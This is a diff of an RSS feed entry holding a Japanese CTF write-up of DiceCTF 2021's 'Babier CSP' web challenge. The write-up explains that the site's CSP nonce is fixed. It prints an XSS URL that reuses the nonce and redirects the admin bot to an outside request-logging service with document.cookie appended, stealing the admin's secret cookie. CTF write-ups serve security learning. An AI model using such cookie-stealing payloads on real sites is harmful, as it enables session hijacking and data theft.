@@ -1,14 +1,12 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>DiceCTF2021s on CTF Writeups</title>
+    <title>DiceCTF2021s on CTF Writeup</title>
     <link>/dicectf2021/</link>
-    <description>Recent content in DiceCTF2021s on CTF Writeups</description>
+    <description>Recent content in DiceCTF2021s on CTF Writeup</description>
     <generator>Hugo -- gohugo.io</generator>
-    
-	<atom:link href="/dicectf2021/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <language>en</language>
+    <copyright>© R* 2022</copyright><atom:link href="/dicectf2021/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title></title>
       <link>/dicectf2021/babiercsp/</link>
@@ -19,7 +17,24 @@
 Admin Bot
 The admin will set a cookie secret equal to config.secret in index.js.
 解説 まず babier-csp.dicec.tf は name に渡された文字列をそのまま表示させています。そのため XSS が期待できますが、 &amp;lt;script&amp;gt;alert(&#39;ok&#39;)&amp;lt;/script&amp;gt; などを直接入れても以下のように怒られます。
-Refused to execute inline script because it violates the following Content Security Policy directive: &amp;quot;script-src &#39;nonce-LRGWAXOY98Es0zz0QOVmag==&#39;&amp;quot;. Either the &#39;unsafe-inline&#39; keyword, a hash (&#39;sha256-GhSELej6D4No8Cu4c6BlA7SQooAXc4iM9HQ5s9uW7Gw=&#39;), or a nonce (&#39;nonce-...&#39;) is required to enable inline execution.  script タグの nonce 属性には、CSP(Content Security Policy) によって JavaScript の実行を制限し、XSS などを防ぐ機能があります。しかし nonce の値が予測できてしまえば意味をなさないため、本来はリクエストごとにランダムな文字列を生成しなければならないのですが、このページでは LRGWAXOY98Es0zz0QOVmag== で固定されています。そのため &amp;lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&amp;gt;hoge&amp;lt;/script&amp;gt; という形式で怒られずに任意のスクリプトをインジェクションできます。</description>
+Refused to execute inline script because it violates the following Content Security Policy directive: &amp;#34;script-src &amp;#39;nonce-LRGWAXOY98Es0zz0QOVmag==&amp;#39;&amp;#34;. Either the &amp;#39;unsafe-inline&amp;#39; keyword, a hash (&amp;#39;sha256-GhSELej6D4No8Cu4c6BlA7SQooAXc4iM9HQ5s9uW7Gw=&amp;#39;), or a nonce (&amp;#39;nonce-...&amp;#39;) is required to enable inline execution. script タグの nonce 属性には、CSP(Content Security Policy) によって JavaScript の実行を制限し、XSS などを防ぐ機能があります。しかし nonce の値が予測できてしまえば意味をなさないため、本来はリクエストごとにランダムな文字列を生成しなければならないのですが、このページでは LRGWAXOY98Es0zz0QOVmag== で固定されています。そのため &amp;lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&amp;gt;hoge&amp;lt;/script&amp;gt; という形式で怒られずに任意のスクリプトをインジェクションできます。</description>
+      <content>&lt;h1 id=&#34;webbabier-csp&#34;&gt;web/Babier CSP&lt;/h1&gt;
+&lt;h2 id=&#34;問題&#34;&gt;問題&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;babier-csp.dicec.tf&#34;&gt;babier-csp.dicec.tf&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp&#34;&gt;Admin Bot&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The admin will set a cookie &lt;code&gt;secret&lt;/code&gt; equal to &lt;code&gt;config.secret&lt;/code&gt; in &lt;a href=&#34;https://github.com/raster0x2a/CTF-writeup/blob/master/DiceCTF2021/index.js&#34;&gt;index.js&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;解説&#34;&gt;解説&lt;/h2&gt;
+&lt;p&gt;まず &lt;a href=&#34;babier-csp.dicec.tf&#34;&gt;babier-csp.dicec.tf&lt;/a&gt; は name に渡された文字列をそのまま表示させています。そのため XSS が期待できますが、 &lt;code&gt;&amp;lt;script&amp;gt;alert(&#39;ok&#39;)&amp;lt;/script&amp;gt;&lt;/code&gt; などを直接入れても以下のように怒られます。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Refused to execute inline script because it violates the following Content Security Policy directive: &amp;#34;script-src &amp;#39;nonce-LRGWAXOY98Es0zz0QOVmag==&amp;#39;&amp;#34;. Either the &amp;#39;unsafe-inline&amp;#39; keyword, a hash (&amp;#39;sha256-GhSELej6D4No8Cu4c6BlA7SQooAXc4iM9HQ5s9uW7Gw=&amp;#39;), or a nonce (&amp;#39;nonce-...&amp;#39;) is required to enable inline execution.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;script タグの nonce 属性には、CSP(Content Security Policy) によって JavaScript の実行を制限し、XSS などを防ぐ機能があります。しかし nonce の値が予測できてしまえば意味をなさないため、本来はリクエストごとにランダムな文字列を生成しなければならないのですが、このページでは &lt;code&gt;LRGWAXOY98Es0zz0QOVmag==&lt;/code&gt; で固定されています。そのため &lt;code&gt;&amp;lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&amp;gt;hoge&amp;lt;/script&amp;gt;&lt;/code&gt; という形式で怒られずに任意のスクリプトをインジェクションできます。&lt;/p&gt;
+&lt;p&gt;次に &lt;a href=&#34;https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp&#34;&gt;Admin Bot&lt;/a&gt; では、 URL を入力して submit すると入力した URL に Admin がアクセスしてくれます。Admin の cookie を得ることが第一の目的なので、 &lt;a href=&#34;babier-csp.dicec.tf&#34;&gt;babier-csp.dicec.tf&lt;/a&gt; にアクセスさせてから、cookie をクエリに含めてリクエスト内容を確認できる URL に遷移させることを考えます。
+私はリクエストを確認するために &lt;a href=&#34;https://requestinspector.com/&#34;&gt;Request Inspector&lt;/a&gt; というサイトを利用しました。
+具体的には以下の URL を入力することで cookie が確認できました。&lt;br&gt;
+&lt;code&gt;https://babier-csp.dicec.tf/?name=&amp;lt;script nonce=LRGWAXOY98Es0zz0QOVmag==&amp;gt;location.href=`[Request Inspectorで発行したURL]?${document.cookie}`&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;index.js&lt;/code&gt;を見てみると&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;SECRET&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;express&lt;/span&gt;.&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;__dirname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/secret&amp;#34;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;とあるため、 &lt;code&gt;https://babier-csp.dicec.tf/[cookieのsecretの値]&lt;/code&gt; にアクセスしてみると、ソースのコメントにフラグが書いてあります。&lt;/p&gt;
+</content>
     </item>
     
   </channel>
